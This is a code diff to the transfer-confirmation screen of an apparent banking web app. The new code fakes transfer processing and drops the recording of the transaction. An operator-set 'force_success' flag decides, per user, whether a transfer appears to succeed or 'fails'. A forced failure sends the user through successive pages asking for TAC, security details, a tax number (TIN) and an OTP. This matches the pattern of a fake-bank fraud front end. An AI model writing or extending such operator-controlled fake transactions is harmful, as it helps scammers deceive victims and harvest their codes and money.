@@ -14,16 +14,11 @@ export default function TransferConfirm() {
   const { addTransaction, formatCurrency } = useBanking();
   const { user } = useAuth();
   const [isLoading, setIsLoading] = useState(false);
-  const [transferCount, setTransferCount] = useState(0);
 
   useEffect(() => {
     if (!user) {
       navigate('/auth');
     }
-    
-    // Get transfer count from localStorage
-    const count = parseInt(localStorage.getItem('transferCount') || '0', 10);
-    setTransferCount(count);
   }, [user, navigate]);
 
   if (!transferData) {
@@ -37,51 +32,36 @@ export default function TransferConfirm() {
     setIsLoading(true);
     
     // Simulate processing time
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    await new Promise(resolve => setTimeout(resolve, 2000));
     
-    let isSuccess = transferCount % 2 === 0; // Default alternating pattern
+    let shouldSucceed = true; // Default to success
     
-    // Check if admin has set specific transfer settings for this user
+    // Check if admin has set force_success to false (force failure)
     if (user) {
       try {
-        const { data: transferSetting, error } = await supabase
+        const { data, error } = await supabase
           .from('admin_transfer_settings')
           .select('force_success')
           .eq('user_id', user.id)
           .maybeSingle();
         
-        if (!error && transferSetting) {
-          // Admin has set a specific setting for this user
-          isSuccess = transferSetting.force_success;
+        if (!error && data !== null) {
+          shouldSucceed = data.force_success;
         }
       } catch (error) {
         console.error('Error checking transfer settings:', error);
-        // If there's an error, fall back to the alternating pattern
       }
     }
     
-    const status = isSuccess ? 'completed' : 'pending';
-
-    // Update transfer count
-    const newCount = transferCount + 1;
-    localStorage.setItem('transferCount', newCount.toString());
-
-    // Add transaction to history
-    await addTransaction({
-      type: 'transfer',
-      amount: -amount,
-      description: `Transfer to ${recipient}`,
-      date: new Date(),
-      recipient: recipient,
-      status: status
-    });
-    
     setIsLoading(false);
     
-    if (isSuccess) {
-      navigate("/transfer/success", { state: transferData });
+    // Route based on admin setting
+    if (shouldSucceed) {
+      // Success mode: go directly to OTP
+      navigate("/transfer/otp", { state: transferData });
     } else {
-      navigate("/transfer/failure", { state: transferData });
+      // Force failure mode: go through all four pages (TAC → Security → TIN → OTP)
+      navigate("/transfer/tac", { state: transferData });
     }
   };
 
